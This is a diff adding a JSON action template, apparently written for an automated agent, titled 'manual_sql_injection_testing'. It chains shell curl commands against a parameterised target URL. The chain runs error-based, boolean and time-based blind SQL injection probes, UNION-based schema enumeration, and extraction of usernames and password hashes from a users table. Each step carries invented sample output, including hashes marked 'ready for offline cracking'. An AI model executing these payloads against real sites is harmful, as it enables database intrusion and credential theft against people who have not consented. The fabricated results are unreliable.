@@ -1,0 +1,34 @@
+{
+  "name": "manual_sql_injection_testing",
+  "description": "Manual SQL injection testing using curl and command-line tools for deeper understanding",
+  "pattern": "manual.*sql.*inject|curl.*sql|sql.*payload.*test|union.*select",
+  "parameters": ["target_url", "payload"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s \"{{target_url}}?id=1'\" | grep -i error"]},
+      "expected_output": {"type": "string", "example": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1\n\nSQL syntax error detected - vulnerable to injection"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s \"{{target_url}}?id=1 OR 1=1--\" && curl -s \"{{target_url}}?id=1 AND 1=2--\" | wc -l"]},
+      "expected_output": {"type": "string", "example": "Testing boolean-based injection:\n\nPayload: 1 OR 1=1--\nResponse: 2847 lines (returns all records)\n\nPayload: 1 AND 1=2--\nResponse: 0 lines (returns no records)\n\nBoolean-based blind SQL injection confirmed"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s \"{{target_url}}?id=1' UNION SELECT NULL,NULL,NULL--\" | grep -i error"]},
+      "expected_output": {"type": "string", "example": "No error - correct column count found\n\nTesting data extraction:\ncurl \"{{target_url}}?id=1' UNION SELECT 1,version(),database()--\"\n\nMySQL Version: 5.7.33-0ubuntu0.18.04.1\nCurrent Database: webapp_db\n\nUnion-based injection successful - 3 columns detected"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s \"{{target_url}}?id=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\""]},
+      "expected_output": {"type": "string", "example": "Tables in database:\n\nusers,products,orders,sessions,admin_users,payment_info,logs\n\nEnumerating users table:\ncurl \"{{target_url}}?id=1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--\"\n\nColumns: id,username,password,email,created_at,role,api_key\n\nDatabase structure successfully enumerated"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s \"{{target_url}}?id=1' UNION SELECT 1,concat(username,':',password),email FROM users--\""]},
+      "expected_output": {"type": "string", "example": "Extracted credentials:\n\nadmin:5f4dcc3b5aa765d61d8327deb882cf99:admin@webapp.com\njohn_doe:098f6bcd4621d373cade4e832627b4f6:john@example.com\ntestuser:e99a18c428cb38d5f260853678922e03:test@webapp.com\ndbmanager:5d41402abc4b2a76b9719d911017c592:dbadmin@webapp.com\n\nPassword hashes extracted - ready for offline cracking"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s \"{{target_url}}?id=1' AND SLEEP(5)--\" -w 'Time: %{time_total}s\\n' -o /dev/null"]},
+      "expected_output": {"type": "string", "example": "Time: 5.234s\n\nDelay detected - time-based blind injection confirmed\n\nTesting data extraction:\ncurl \"{{target_url}}?id=1' AND IF(SUBSTRING(database(),1,1)='w',SLEEP(5),0)--\" -w '%{time_total}s'\n\nTime: 5.123s - First character is 'w'\nTime: 0.089s - Character not 'x'\n\nTime-based blind injection working - can extract data character by character"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
